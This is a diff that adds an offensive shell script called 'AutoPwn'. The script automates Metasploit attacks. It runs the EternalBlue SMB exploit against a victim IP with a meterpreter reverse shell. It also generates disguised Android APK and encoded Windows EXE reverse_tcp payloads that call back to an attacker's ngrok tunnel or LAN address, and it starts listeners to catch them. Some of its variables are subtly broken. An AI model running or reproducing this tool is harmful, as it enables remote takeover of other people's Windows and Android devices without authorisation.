@@ -1,0 +1,110 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################################
+#                           AutoPwn                           #
+#-Info--------------------------------------------------------#
+#    Enter Your Target, Hack Him, and Get Markdown Report     #
+#-About-------------------------------------------------------#
+#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
+#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
+#--╼▰[ Script Name ]-╼▰[ HacKingPro-AutoPwn                   #
+#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
+###############################################################
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+# Location: Made With LOVE IN ISRAEL !                        #
+###############################################################
+#-Metadata----------------------------------------------------#
+#--╼▰[ Version ]-╼▰[ 0.2.2 ]                                  #
+#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
+#--╼▰[ Created ]-╼▰[ 19-08-2022 ]                             #
+#--╼▰[ Update ]-╼▰[ 19-08-2022 ]                              #
+###############################################################
+
+choice(){
+  echo "What Your Target OS?"
+  echo "Press 1 for Android"
+  echo "Press 2 for Windows"
+  read os;
+};
+
+create() {
+  echo 'payload $payload created successfully in';
+  pwd
+  echo 'starting the $payload handler.....';
+}
+
+echo '\n 		             An automated pwning tool\n';
+echo 'What type of attack would you like to do?(Press Ctrl + C to exit!)';
+echo 'Press 1 for Eternal Blue!';
+echo 'Press 2 for the regular meterpreter payload attack!';
+read type;
+if [[ type -eq '1' ]]; then
+  echo 'This attack only works on windows, (till Windows 7!) ';
+  echo 'MAKE SURE THE VICTIM IS ON THE SAME NETWORK!!';
+  echo 'Enter the victim`s IP address';
+  read vip ;
+  echo 'Enter your local IP address' ;
+  read lip ;
+  echo "Attacking $vip ..." ;
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $vip; set LHOST $lip ; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit" ;
+elif [[ type -eq '2' ]]; then
+  clear;
+  echo '\n 		             An automated pwning tool';
+  echo '\n        ---------You need some Social Engineering skills for this !------------\n';
+  echo 'Press 1 for WAN (over the internet)';
+  echo 'Press 2 for LAN (On the same network)';
+  read attack;
+  if [[ $attack -eq "1" ]]; then
+    echo 'start ngrok on your device, by opening\n
+    a new window in the terminal
+    and type "ngrok tcp 4444" then,
+    note down the port number after tcp://0.ngrok.tcp.io:"<port>"
+    and paste it below'
+    read pport;
+    echo 'name of the desired file';
+    read wname;
+    choice;
+    if [[ os -eq '1' ]]; then
+      # Payload
+      msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT=$pport R > $wname.apk;
+      create
+      # Listener
+      msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD android/meterpreter/reverse_tcp;exploit'
+    elif [[ os -eq '2' ]]; then
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST="0.tcp.ngrok.io" LPORT="$port" -f exe -e x86/shikata_ga_nai -i 30 > $wname.exe
+      create
+      msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0; set LPORT 4444;set PAYLOAD windows/meterpreter/reverse_tcp;exploit'
+    else
+      echo 'Oops, wrong choice!, try again...';
+      choice
+    fi ;
+  elif [[ attack -eq '2' ]]; then
+    echo 'Enter your machine`s local ip adress';
+    read ipad
+    echo 'name of the desired file';
+    read lname
+    choice;
+    if [[ os -eq 1 ]]; then
+      msfvenom --platform android -p android/meterpreter/reverse_tcp $ipad 4444 R > $lname.apk ;
+      create;
+      msfconsole -q -x 'use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit';
+    elif [[ os -eq 2 ]]; then
+      msfvenom -p windows/meterpreter/reverse_tcp $ipad 4444 -f exe -e x86/shikata_ga_nai -i 30 > $lname.exe;
+      create;
+      msfconsole -q -x 'use exploit/multi/handler;set LHOST $ipad; set LPORT 4444;set PAYLOAD $payload;exploit';
+    else
+      echo '\nOops, wrong choice!, try again...\n';
+      choice;
+    fi ;
+  else
+    exit;
+  fi;
+fi
